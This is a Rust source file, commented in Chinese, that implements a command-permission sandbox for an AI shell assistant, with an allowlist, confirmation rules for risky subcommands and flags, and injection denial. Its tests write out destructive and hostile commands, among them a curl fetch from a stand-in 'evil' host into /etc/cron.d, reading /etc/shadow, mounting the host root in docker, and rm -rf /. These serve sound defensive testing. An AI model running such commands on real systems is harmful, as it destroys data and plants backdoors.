use crate::modules::ai::command_parser::{detect_injection, parse_statement};
use serde::{Deserialize, Serialize};

/// 沙箱模式
#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum SandboxMode {
    /// 标准沙箱：白名单放行，其余拦截请求确认
    Standard,
    /// Full 模式：关闭沙箱，不做命令限制
    Full,
}

impl Default for SandboxMode {
    fn default() -> Self {
        SandboxMode::Standard
    }
}

/// 风险级别
#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum RiskLevel {
    /// 高危：可能造成不可逆损坏
    Critical,
    /// 敏感：需要谨慎
    High,
    /// 一般确认
    Medium,
}

/// 权限判定结果
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "verdict", rename_all = "snake_case")]
pub enum SandboxVerdict {
    /// 允许直接执行
    Allow,
    /// 需要用户二次确认
    NeedConfirm {
        reason: String,
        risk_level: RiskLevel,
        /// 具体触发拦截的命令段
        matched_command: String,
    },
    /// 拒绝执行（注入攻击等）
    Deny { reason: String },
}

// ── 标准沙箱白名单 ────────────────────────────────────────────────────────────

/// 安全的只读/查询命令（标准沙箱自动放行）
const STANDARD_WHITELIST: &[&str] = &[
    // 文件系统查看
    "ls",
    "ll",
    "la",
    "dir",
    "cat",
    "head",
    "tail",
    "less",
    "more",
    "file",
    "stat",
    "du",
    "df",
    "find",
    "locate",
    "which",
    "whereis",
    "tree",
    // 文本处理
    "grep",
    "egrep",
    "fgrep",
    "rg",
    "awk",
    "sed",
    "cut",
    "sort",
    "uniq",
    "wc",
    "tr",
    "diff",
    "comm",
    "join",
    "paste",
    "column",
    "jq",
    "yq",
    "echo",
    "printf",
    "tee",
    // 系统信息
    "pwd",
    "whoami",
    "id",
    "hostname",
    "uname",
    "date",
    "uptime",
    "w",
    "who",
    "last",
    "lastlog",
    "env",
    "printenv",
    "set",
    // 进程查看
    "ps",
    "top",
    "htop",
    "pgrep",
    "pstree",
    "lsof",
    // 网络查看
    "netstat",
    "ss",
    "ip",
    "ifconfig",
    "arp",
    "route",
    "ping",
    "traceroute",
    "tracepath",
    "mtr",
    "dig",
    "nslookup",
    "host",
    "nmap",
    "curl",
    "wget",
    // 日志查看
    "journalctl",
    "dmesg",
    "syslog",
    // 包管理（只读）
    "apt-cache",
    "yum",
    "dnf",
    "rpm",
    "dpkg",
    // 容器（只读）
    "docker",
    "podman",
    "kubectl",
    "helm",
    // 其他工具
    "man",
    "info",
    "help",
    "type",
    "history",
    "alias",
    "openssl",
    "base64",
    "md5sum",
    "sha256sum",
    "systemctl",
    "service",
    // 编辑器（查看模式）
    "vim",
    "vi",
    "nano",
    "less",
    // 性能
    "vmstat",
    "iostat",
    "sar",
    "free",
    "nproc",
];

/// 标准沙箱中需要确认的命令子命令（docker rm 等）。
///
/// 注意：白名单以命令名为粒度，但许多命令的部分子命令可派生任意执行或造成
/// 破坏（`docker run` 可挂载宿主根目录、`kubectl exec` 可进容器执行、
/// `systemctl stop` 可停服务）。这些子命令必须强制确认，不能因命令名在白名单
/// 就直接放行。
const STANDARD_CONFIRM_SUBCMDS: &[(&str, &str, RiskLevel)] = &[
    // docker / podman：run/exec/create 可任意执行，其余为破坏性操作
    ("docker", "run", RiskLevel::Critical),
    ("docker", "exec", RiskLevel::Critical),
    ("docker", "create", RiskLevel::High),
    ("docker", "cp", RiskLevel::High),
    ("docker", "build", RiskLevel::High),
    ("docker", "load", RiskLevel::High),
    ("docker", "commit", RiskLevel::High),
    ("docker", "rm", RiskLevel::High),
    ("docker", "stop", RiskLevel::High),
    ("docker", "kill", RiskLevel::High),
    ("docker", "rmi", RiskLevel::High),
    ("docker", "prune", RiskLevel::High),
    ("podman", "run", RiskLevel::Critical),
    ("podman", "exec", RiskLevel::Critical),
    ("podman", "create", RiskLevel::High),
    ("podman", "cp", RiskLevel::High),
    ("podman", "rm", RiskLevel::High),
    ("podman", "kill", RiskLevel::High),
    // kubectl：exec/cp 可任意执行，apply/patch/replace/edit/scale 可变更集群
    ("kubectl", "exec", RiskLevel::Critical),
    ("kubectl", "cp", RiskLevel::Critical),
    ("kubectl", "apply", RiskLevel::Critical),
    ("kubectl", "replace", RiskLevel::Critical),
    ("kubectl", "patch", RiskLevel::High),
    ("kubectl", "edit", RiskLevel::High),
    ("kubectl", "scale", RiskLevel::High),
    ("kubectl", "delete", RiskLevel::Critical),
    ("kubectl", "drain", RiskLevel::Critical),
    ("kubectl", "cordon", RiskLevel::High),
    // helm：安装/升级/回滚/卸载均变更集群状态
    ("helm", "install", RiskLevel::High),
    ("helm", "upgrade", RiskLevel::High),
    ("helm", "rollback", RiskLevel::High),
    ("helm", "uninstall", RiskLevel::High),
    ("helm", "delete", RiskLevel::High),
    // systemctl / service：变更服务状态
    ("systemctl", "start", RiskLevel::High),
    ("systemctl", "stop", RiskLevel::High),
    ("systemctl", "restart", RiskLevel::High),
    ("systemctl", "reload", RiskLevel::High),
    ("systemctl", "disable", RiskLevel::High),
    ("systemctl", "enable", RiskLevel::High),
    ("systemctl", "mask", RiskLevel::High),
    ("systemctl", "kill", RiskLevel::High),
    ("systemctl", "isolate", RiskLevel::Critical),
];

/// 白名单命令携带下列参数时可派生任意执行/写文件，须强制确认。
/// 元组：(命令名, 危险参数前缀, 说明, 风险级别)。
/// 参数按前缀匹配（覆盖 `-o file` 与 `-ofile`、`--output=file` 等写法）。
const STANDARD_DANGEROUS_ARGS: &[(&str, &str, &str, RiskLevel)] = &[
    // find 可借 -exec/-execdir/-delete/-fprintf 执行命令或删文件
    ("find", "-exec", "find -exec 可执行任意命令", RiskLevel::Critical),
    ("find", "-execdir", "find -execdir 可执行任意命令", RiskLevel::Critical),
    ("find", "-ok", "find -ok 可执行任意命令", RiskLevel::Critical),
    ("find", "-delete", "find -delete 会删除文件", RiskLevel::High),
    ("find", "-fprint", "find -fprint* 会写文件", RiskLevel::High),
    // curl / wget 写文件可落地后门（cron、authorized_keys）
    ("curl", "-o", "curl 写文件", RiskLevel::High),
    ("curl", "-O", "curl 写文件", RiskLevel::High),
    ("curl", "--output", "curl 写文件", RiskLevel::High),
    ("curl", "--remote-name", "curl 写文件", RiskLevel::High),
    ("wget", "-O", "wget 写文件", RiskLevel::High),
    ("wget", "--output-document", "wget 写文件", RiskLevel::High),
    ("wget", "-P", "wget 写文件", RiskLevel::High),
];

/// 这些白名单命令的首个「脚本参数」本身即可执行任意代码（awk/sed 程序、
/// perl/python 的 -e 等），标准沙箱下一律要求确认。
const STANDARD_SCRIPT_INTERPRETERS: &[&str] = &["awk", "gawk", "mawk", "sed"];

// ── 判定引擎 ──────────────────────────────────────────────────────────────────

pub struct Sandbox {
    pub mode: SandboxMode,
}

impl Sandbox {
    pub fn new(mode: SandboxMode) -> Self {
        Self { mode }
    }

    /// 对整条命令字符串进行权限判定
    pub fn check(&self, command: &str) -> SandboxVerdict {
        if self.mode == SandboxMode::Full {
            return SandboxVerdict::Allow;
        }

        // 1. 标准模式下执行注入检测
        if detect_injection(command) {
            return SandboxVerdict::Deny {
                reason: "检测到潜在命令注入（$()、反引号等），已拒绝执行".to_string(),
            };
        }

        let stmt = parse_statement(command);

        match self.mode {
            SandboxMode::Standard => self.check_standard(&stmt, command),
            SandboxMode::Full => SandboxVerdict::Allow,
        }
    }

    // ── 标准沙箱（白名单） ──────────────────────────────────────────────────

    fn check_standard(
        &self,
        stmt: &crate::modules::ai::command_parser::ParsedStatement,
        _raw: &str,
    ) -> SandboxVerdict {
        for cmd in &stmt.commands {
            let name = cmd.name.as_str();

            // 检查是否在白名单中
            if STANDARD_WHITELIST.contains(&name) {
                // 检查特殊子命令（如 docker rm）
                if let Some(verdict) = self.check_standard_subcmd(cmd) {
                    return verdict;
                }
                // 白名单命令放行
                continue;
            }

            // 不在白名单：需要确认
            return SandboxVerdict::NeedConfirm {
                reason: format!("命令 `{}` 不在安全白名单中，需要确认后执行", name),
                risk_level: RiskLevel::Medium,
                matched_command: cmd.raw.clone(),
            };
        }
        SandboxVerdict::Allow
    }

    fn check_standard_subcmd(
        &self,
        cmd: &crate::modules::ai::command_parser::ParsedCommand,
    ) -> Option<SandboxVerdict> {
        let name = cmd.name.as_str();

        // 子命令通常是第一个非选项参数（跳过 `docker --context x run` 这类全局选项）。
        let subcommand = cmd
            .args
            .iter()
            .find(|a| !a.starts_with('-'))
            .map(|a| a.as_str());

        // 1. 危险子命令（docker run / kubectl exec / systemctl stop 等）。
        for (base, sub, level) in STANDARD_CONFIRM_SUBCMDS {
            if name == *base && subcommand == Some(*sub) {
                return Some(SandboxVerdict::NeedConfirm {
                    reason: format!("`{} {}` 可能造成变更或任意执行，需要确认", base, sub),
                    risk_level: *level,
                    matched_command: cmd.raw.clone(),
                });
            }
        }

        // 2. 危险参数（find -exec / curl -o 等）。
        for (base, flag, desc, level) in STANDARD_DANGEROUS_ARGS {
            if name == *base
                && cmd.args.iter().any(|a| a == flag || a.starts_with(&format!("{}=", flag)))
            {
                return Some(SandboxVerdict::NeedConfirm {
                    reason: format!("{}，需要确认", desc),
                    risk_level: *level,
                    matched_command: cmd.raw.clone(),
                });
            }
        }

        // 3. 脚本解释器（awk/sed 程序可内嵌任意执行）。只要带了非选项参数
        //    （即脚本体），就要求确认。
        if STANDARD_SCRIPT_INTERPRETERS.contains(&name)
            && cmd.args.iter().any(|a| !a.starts_with('-'))
        {
            return Some(SandboxVerdict::NeedConfirm {
                reason: format!("`{}` 脚本可内嵌任意命令执行，需要确认", name),
                risk_level: RiskLevel::High,
                matched_command: cmd.raw.clone(),
            });
        }

        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_standard_allow() {
        let sb = Sandbox::new(SandboxMode::Standard);
        assert!(matches!(sb.check("ls -la /tmp"), SandboxVerdict::Allow));
        assert!(matches!(
            sb.check("ps aux | grep nginx"),
            SandboxVerdict::Allow
        ));
        assert!(matches!(sb.check("cat /etc/hosts"), SandboxVerdict::Allow));
    }

    #[test]
    fn test_standard_need_confirm() {
        let sb = Sandbox::new(SandboxMode::Standard);
        assert!(matches!(
            sb.check("rm -rf /tmp/test"),
            SandboxVerdict::NeedConfirm { .. }
        ));
        assert!(matches!(
            sb.check("apt install nginx"),
            SandboxVerdict::NeedConfirm { .. }
        ));
    }

    #[test]
    fn test_standard_subcommand_need_confirm() {
        let sb = Sandbox::new(SandboxMode::Standard);
        assert!(matches!(
            sb.check("docker rm container-1"),
            SandboxVerdict::NeedConfirm {
                risk_level: RiskLevel::High,
                ..
            }
        ));
        assert!(matches!(
            sb.check("kubectl delete pod demo"),
            SandboxVerdict::NeedConfirm {
                risk_level: RiskLevel::Critical,
                ..
            }
        ));
    }

    #[test]
    fn test_full_allow() {
        let sb = Sandbox::new(SandboxMode::Full);
        assert!(matches!(sb.check("rm -rf /"), SandboxVerdict::Allow));
        assert!(matches!(
            sb.check("mkfs.ext4 /dev/sda"),
            SandboxVerdict::Allow
        ));
    }

    #[test]
    fn test_full_allows_injection_patterns() {
        let sb = Sandbox::new(SandboxMode::Full);
        assert!(matches!(
            sb.check("ls $(cat /etc/shadow)"),
            SandboxVerdict::Allow
        ));
    }

    #[test]
    fn test_standard_allow_safe() {
        let sb = Sandbox::new(SandboxMode::Standard);
        assert!(matches!(sb.check("ls -la"), SandboxVerdict::Allow));
        assert!(matches!(sb.check("cat /etc/passwd"), SandboxVerdict::Allow));
    }

    #[test]
    fn test_injection_denied() {
        let sb = Sandbox::new(SandboxMode::Standard);
        assert!(matches!(
            sb.check("ls $(cat /etc/shadow)"),
            SandboxVerdict::Deny { .. }
        ));
    }

    #[test]
    fn test_docker_run_needs_confirm() {
        let sb = Sandbox::new(SandboxMode::Standard);
        // docker 在白名单，但 run/exec 可挂载宿主根目录或进容器执行任意命令
        assert!(matches!(
            sb.check("docker run -v /:/host alpine sh -c 'rm -rf /host'"),
            SandboxVerdict::NeedConfirm {
                risk_level: RiskLevel::Critical,
                ..
            }
        ));
        assert!(matches!(
            sb.check("docker exec -it web bash"),
            SandboxVerdict::NeedConfirm { .. }
        ));
        // docker ps 仍应放行
        assert!(matches!(sb.check("docker ps -a"), SandboxVerdict::Allow));
    }

    #[test]
    fn test_kubectl_apply_and_exec_need_confirm() {
        let sb = Sandbox::new(SandboxMode::Standard);
        assert!(matches!(
            sb.check("kubectl exec pod -- sh -c whoami"),
            SandboxVerdict::NeedConfirm { .. }
        ));
        assert!(matches!(
            sb.check("kubectl apply -f evil.yaml"),
            SandboxVerdict::NeedConfirm { .. }
        ));
        assert!(matches!(sb.check("kubectl get pods"), SandboxVerdict::Allow));
    }

    #[test]
    fn test_find_exec_needs_confirm() {
        let sb = Sandbox::new(SandboxMode::Standard);
        assert!(matches!(
            sb.check("find / -name x -exec rm -rf {} ;"),
            SandboxVerdict::NeedConfirm { .. }
        ));
        assert!(matches!(
            sb.check("find /tmp -delete"),
            SandboxVerdict::NeedConfirm { .. }
        ));
        // 普通 find 查询仍放行
        assert!(matches!(
            sb.check("find /var/log -name '*.log'"),
            SandboxVerdict::Allow
        ));
    }

    #[test]
    fn test_awk_script_needs_confirm() {
        let sb = Sandbox::new(SandboxMode::Standard);
        assert!(matches!(
            sb.check("awk 'BEGIN{system(\"rm -rf /\")}'"),
            SandboxVerdict::NeedConfirm { .. }
        ));
    }

    #[test]
    fn test_systemctl_stop_needs_confirm() {
        let sb = Sandbox::new(SandboxMode::Standard);
        assert!(matches!(
            sb.check("systemctl stop nginx"),
            SandboxVerdict::NeedConfirm { .. }
        ));
        assert!(matches!(
            sb.check("systemctl status nginx"),
            SandboxVerdict::Allow
        ));
    }

    #[test]
    fn test_curl_output_needs_confirm() {
        let sb = Sandbox::new(SandboxMode::Standard);
        assert!(matches!(
            sb.check("curl http://evil/x -o /etc/cron.d/x"),
            SandboxVerdict::NeedConfirm { .. }
        ));
        // 只读取不落地仍放行
        assert!(matches!(
            sb.check("curl -s http://example.com"),
            SandboxVerdict::Allow
        ));
    }

    #[test]
    fn test_redirect_write_needs_confirm() {
        let sb = Sandbox::new(SandboxMode::Standard);
        // echo 在白名单，但重定向目标 `/etc/cron.d/x` 会被拆成独立段，
        // 非白名单命令 → 需确认，堵住写后门文件
        assert!(matches!(
            sb.check("echo '* * * * root sh' > /etc/cron.d/x"),
            SandboxVerdict::NeedConfirm { .. }
        ));
    }

    #[test]
    fn test_background_bypass_needs_confirm() {
        let sb = Sandbox::new(SandboxMode::Standard);
        // 单 `&` 后台符现在会拆分，rm 段落触发确认
        assert!(matches!(
            sb.check("ls & rm -rf /tmp"),
            SandboxVerdict::NeedConfirm { .. }
        ));
    }
}
